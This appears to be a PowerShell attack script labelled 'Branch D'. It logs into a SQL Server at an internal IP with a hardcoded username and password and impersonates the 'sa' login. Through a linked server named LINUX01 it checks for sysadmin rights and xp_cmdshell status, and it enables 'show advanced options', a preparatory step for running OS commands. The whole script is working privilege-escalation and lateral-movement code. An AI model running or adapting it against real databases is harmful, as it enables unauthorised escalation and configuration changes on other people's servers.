# Branch D: probe linked-login rights on linux01 via EXEC AT
$ErrorActionPreference = "Continue"
Add-Type -AssemblyName System.Data
$connStr = "Server=192.168.77.22;Database=master;Integrated Security=false;User ID=analyst_t1;Password=T13r_An@lyst!;TrustServerCertificate=True;"
$conn = New-Object System.Data.SqlClient.SqlConnection($connStr)
$conn.Open()
Write-Output "SQL_OK: connected to mbr01 as analyst_t1"

function Invoke-Reader($sql) {
  $c = $conn.CreateCommand()
  $c.CommandText = "EXECUTE AS LOGIN = 'sa'; $sql; REVERT"
  $r = $c.ExecuteReader()
  while ($r.Read()) { for ($i=0; $i -lt $r.FieldCount; $i++) { if (-not $r.IsDBNull($i)) { Write-Output "$($r.GetName($i)): $($r.GetValue($i))" } } }
  $r.Close()
}

Write-Output "=== identity + sysadmin on linux01 ==="
try {
  Invoke-Reader "EXEC ('SELECT @@SERVERNAME AS srv, SYSTEM_USER AS u, IS_SRVROLEMEMBER(''sysadmin'') AS is_sa') AT LINUX01;"
} catch { Write-Output "probe1 err: $($_.Exception.Message)" }

Write-Output "=== current xp_cmdshell config on linux01 ==="
try {
  Invoke-Reader "EXEC ('SELECT name, value_in_use FROM sys.configurations WHERE name = ''xp_cmdshell''') AT LINUX01;"
} catch { Write-Output "probe2 err: $($_.Exception.Message)" }

Write-Output "=== sp_configure advanced on linux01 (single stmt) ==="
try {
  Invoke-Reader "EXEC ('EXEC sp_configure ''show advanced options'', 1') AT LINUX01;"
  Write-Output "adv_ok"
} catch { Write-Output "adv err: $($_.Exception.Message)" }

Write-Output "=== recheck xp_cmdshell config ==="
try {
  Invoke-Reader "EXEC ('SELECT name, value_in_use FROM sys.configurations WHERE name = ''xp_cmdshell''') AT LINUX01;"
} catch { Write-Output "probe3 err: $($_.Exception.Message)" }

$conn.Close()
Write-Output "=== BRANCHD_PROBE_DONE ==="
